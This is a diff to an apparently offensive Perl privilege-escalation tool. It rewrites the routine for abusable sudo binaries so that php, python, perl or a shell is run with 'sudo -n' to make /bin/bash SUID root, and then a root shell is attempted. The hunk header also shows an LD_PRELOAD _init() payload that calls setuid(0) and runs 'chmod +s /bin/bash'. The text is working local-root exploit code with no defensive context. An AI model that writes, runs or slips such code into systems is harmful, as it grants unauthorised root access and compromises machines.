@@ -391,12 +391,23 @@ void _init() { unsetenv("LD_PRELOAD"); setuid(0); system("chmod +s /bin/bash"); 
             $bin_name =~ s/\s.*//;
             if (exists $SUDO_ABUSE{$bin_name}) {
                 print "${G}[+] Exploitable sudo: $bin_name ($bin_path)${Z}\n";
-                my $cmd = "sudo -n " . $SUDO_ABUSE{$bin_name};
-                print "${C}[*] Running: $cmd${Z}\n";
-                sys_cmd($cmd);
+                # Strategy: use sudo to chmod +s /bin/bash, then exec it
+                my $suid_cmd;
+                if ($bin_name eq "php") {
+                    $suid_cmd = "sudo -n php -r 'system(\"chmod +s /bin/bash\");'";
+                } elsif ($bin_name =~ /^python3?$/) {
+                    $suid_cmd = qq{sudo -n $bin_name -c 'import os;os.system("chmod +s /bin/bash")'};
+                } elsif ($bin_name eq "perl") {
+                    $suid_cmd = q{sudo -n perl -e 'system("chmod +s /bin/bash")'};
+                } elsif ($bin_name =~ /^(bash|sh|dash|ash|busybox|zsh|ksh|csh)$/) {
+                    $suid_cmd = "sudo -n $bin_path -c 'chmod +s /bin/bash'";
+                } else {
+                    $suid_cmd = qq{sudo -n $bin_path -c 'chmod +s /bin/bash'};
+                }
+                print "${C}[*] $suid_cmd${Z}\n";
+                system($suid_cmd);
                 try_suid_bash();
-                droproot();
-                return 1 if isroot();
+                return 1;
             }
         }
     }
